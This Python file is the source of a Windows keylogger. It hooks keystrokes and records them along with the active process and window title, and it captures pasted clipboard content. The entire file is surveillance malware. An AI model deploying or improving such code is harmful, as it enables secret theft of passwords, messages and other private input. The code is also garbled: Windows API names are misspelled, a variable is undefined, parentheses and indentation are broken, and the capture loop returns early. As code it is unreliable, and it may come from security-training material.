from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_proccess(self):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadPriocessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.Open_Process(0x400|0x10, False, pid)
        windll.psaspi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
            try:
                self.current_window = window_title.value.decode()
            except UnicodeDecodeError as e:
                print(f'{e}: window anem unknown')

            print('\n', process_id, executable.value.decode(), self.current_window)

            windll.kernel32.CloseHandle(hwnd)
            windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowNAme != self.current_window:
            self.get_current_proccess()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end ='')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}'
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    k1 = KeyLogger()
    hm = pyHook.HookManager
    hm.KeyDown = k1.mykeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessage()
        log = sys.stdout.getvalue()
        sys.stdout = save_stdout
        return log

if __name__ == '__main__':
    print(run())
    print('done.')
